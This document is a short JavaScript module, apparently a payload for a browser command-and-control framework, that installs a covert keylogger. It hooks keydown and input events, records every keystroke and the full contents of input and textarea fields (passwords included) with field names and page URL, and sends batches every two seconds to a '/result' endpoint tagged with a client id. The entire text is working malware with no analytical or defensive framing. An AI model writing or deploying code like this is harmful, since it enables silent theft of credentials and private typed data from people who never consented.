if (window.__pzKL) return 'already running';
window.__pzKL = true;
window.__pzKLBuf = [];

function getContext() {
  var el = document.activeElement;
  if (!el) return null;
  return {
    tag: el.tagName ? el.tagName.toLowerCase() : '',
    name: el.name || '',
    type: el.type || '',
    id: el.id || ''
  };
}

window.__pzKLKeydown = function (e) {
  var k = e.key;
  window.__pzKLBuf.push({
    type: 'keydown',
    key: k.length === 1 ? k : '[' + k + ']',
    ctx: getContext(),
    url: location.href,
    ts: Date.now()
  });
};
document.addEventListener('keydown', window.__pzKLKeydown, true);

window.__pzKLInput = function (e) {
  var el = e.target;
  if (!el || !el.tagName) return;
  var tag = el.tagName.toLowerCase();
  if (tag !== 'input' && tag !== 'textarea') return;
  window.__pzKLBuf.push({
    type: 'input',
    value: el.value,
    ctx: { tag: tag, name: el.name || '', type: el.type || '', id: el.id || '' },
    url: location.href,
    ts: Date.now()
  });
};
document.addEventListener('input', window.__pzKLInput, true);

window.__pzKLTimer = setInterval(function () {
  if (window.__pzKLBuf.length) {
    var batch = window.__pzKLBuf.splice(0);
    fetch('/result', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cid: window.__pzCid, cmd_id: 'keylog', result: { events: batch, url: location.href } })
    });
  }
}, 2000);

return 'keylogger started — capturing keydown + input events every 2s';
